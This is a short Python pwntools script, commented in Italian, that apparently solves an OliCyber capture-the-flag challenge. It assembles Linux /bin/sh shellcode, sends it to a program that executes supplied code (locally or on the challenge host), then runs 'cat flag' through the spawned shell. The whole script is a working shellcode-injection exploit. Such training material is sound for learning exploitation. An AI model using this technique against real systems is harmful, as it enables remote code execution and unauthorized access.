#!/usr/bin/env python3
from pwn import *

if args.REMOTE:
    r = remote("software-20.challs.olicyber.it", 13003)
else:
    exe = ELF("./sw-20", checksec=False)
    r = process([exe.path])

# Assembla lo shellcode per aprire /bin/sh
context.arch = 'x86_64'
shellcode = asm(shellcraft.amd64.linux.sh())
print(f"[*] Shellcode size: {len(shellcode)} bytes")

# Invia carattere iniziale
r.recvuntil(b"iniziare ...")
r.sendline(b"a")

# Manda la dimensione
r.recvuntil(b"size (max 4096): ")
r.sendline(str(len(shellcode)).encode())

# Manda lo shellcode
r.recvuntil(b"bytes: ")
r.send(shellcode)

# Ora abbiamo una shell! Leggiamo la flag
r.recvuntil(b"shellcode...\n")
r.sendline(b"cat flag")

flag = r.recvline(timeout=5).decode().strip()
print(f"\n[FLAG]: {flag}")
